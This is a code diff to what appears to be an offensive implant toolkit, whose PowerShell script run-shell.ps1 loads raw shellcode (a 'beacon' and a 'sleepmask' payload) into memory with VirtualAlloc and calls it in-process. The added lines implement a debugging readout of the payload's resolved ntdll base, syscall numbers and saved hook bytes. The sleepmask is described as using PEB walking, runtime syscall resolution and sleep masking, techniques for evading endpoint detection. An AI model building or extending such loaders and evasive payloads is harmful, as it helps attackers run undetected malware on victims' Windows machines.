@@ -26,7 +26,8 @@
 #                       (C) regsvr32 — then shows the file proof.
 #   run-shell.ps1       the powershell shellcode runner (VirtualAlloc + copy
 #                       + in-process CALL of beacon.bin AND sleepmask.bin; no
-#                       disk image load; reads back the payload's done_flag).
+#                       disk image load; reads back the payload's done_flag +
+#                       a forensic table of the walk's own data section).
 #   beacon.bin          the raw PIC beacon blob that run-shell.ps1 executes.
 #   sleepmask.bin       the REAL flagship payload (PEB walk, runtime syscall
 #                       resolution, NtDelayExecution mask) — run-shell.ps1
@@ -170,6 +171,11 @@ public static class SleepmaskShell {
         Marshal.Copy(new IntPtr(mem.ToInt64() + off), buf, 0, 8);
         return BitConverter.ToInt64(buf, 0);
     }
+    public static byte[] ReadB(IntPtr mem, long off, int n) {
+        byte[] buf = new byte[n];
+        Marshal.Copy(new IntPtr(mem.ToInt64() + off), buf, 0, n);
+        return buf;
+    }
 }
 '@
   Add-Type -TypeDefinition $src -ErrorAction Stop
@@ -194,6 +200,26 @@ public static class SleepmaskShell {
     } else {
       Write-Host "  [powershell] sleepmask done_flag = $done  (expected 1)"
     }
+
+    # --- [2b] forensic readback ------------------------------------------------
+    #   The data section sits at fixed displacements from the END of the blob
+    #   (done_flag = len-66 anchors the rest). This table shows exactly where a
+    #   failed walk died:
+    #     ntdll_base = 0   -> the PEB walk never matched "ntdll.dll"
+    #     data_nr_*  = 0   -> no syscall nr in the export prologue
+    #     saved_*    = 0   -> find_export never returned an address
+    #     all set + flag 0 -> the mask/clock/restore path is at fault
+    $hx = { param($o) "{0:X16}" -f [uint64][SleepmaskShell]::ReadQ($smem, $s.Length - $o) }
+    Write-Host "  [powershell] forensic readback (field = value):"
+    Write-Host "    ntdll_base      = $(& $hx 106)   (PEB walk resolved ntdll)"
+    Write-Host "    data_nr_delay   = $(& $hx 90)   (NtDelayExecution nr, from export prologue)"
+    Write-Host "    data_nr_protect = $(& $hx 82)   (NtProtectVirtualMemory nr)"
+    Write-Host "    saved_ntdelay   = $(& $hx 186)   (original NtDelayExecution bytes @)"
+    Write-Host "    saved_ntprotect = $(& $hx 178)   (original NtProtectVirtualMemory bytes @)"
+    Write-Host "    saved_old_prot  = $(& $hx 170)   (original protection; 0x20 = PAGE_EXECUTE_READ)"
+    Write-Host "    data_t0         = $(& $hx 74)   (stub clock snapshot, 100ns since 1601)"
+    $sb = [SleepmaskShell]::ReadB($smem, $s.Length - 202, 16)
+    Write-Host "    saved_bytes     = $($([System.BitConverter]::ToString($sb[0..11])).Replace('-',' '))   (the 12 original thunk bytes)"
   }
 } catch {
   Write-Host "  [powershell] shellcode runner: $($_.Exception.Message)"
